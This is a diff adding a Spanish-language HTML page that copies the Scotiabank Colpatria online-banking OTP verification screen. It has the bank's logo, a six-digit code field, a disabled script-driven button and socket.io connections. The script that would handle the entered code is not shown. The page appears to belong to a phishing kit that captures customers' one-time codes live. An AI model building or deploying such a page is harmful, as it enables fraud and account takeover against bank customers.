@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación OTP - Banca Virtual</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box" id="otpBox">
+            <img src="img/scotiabank-colpatria-symbol-red.svg" alt="Scotiabank Colpatria" class="logo">
+            
+            <h1>Ingresa a tu Banca Virtual</h1>
+            
+            <p class="otp-message">Ingresa el código que te enviamos vía SMS o correo electrónico</p>
+            
+            <form class="login-form" id="otpForm">
+                <div class="input-group">
+                    <svg class="icon-svg" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 4H4C2.9 4 2.01 4.9 2.01 6L2 18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z" fill="#999999"/>
+                    </svg>
+                    <input type="text" placeholder="Código OTP" class="input-field" id="otp" required maxlength="6" pattern="[0-9]{1,6}" inputmode="numeric">
+                </div>
+                
+                <button type="button" class="login-button" id="btnVerificar" disabled>Ingresar</button>
+                
+                <div class="signup-section">
+                    <a href="#" class="signup-link resend-code">Reenviar código</a>
+                </div>
+            </form>
+        </div>
+
+        <!-- Pantalla de carga -->
+        <div class="loading-screen" id="loadingScreen" style="display: none;">
+            <img src="img/login-graphic.svg" alt="Cargando" class="loading-graphic">
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="otp-optimized.js"></script>
+</body>
+</html>
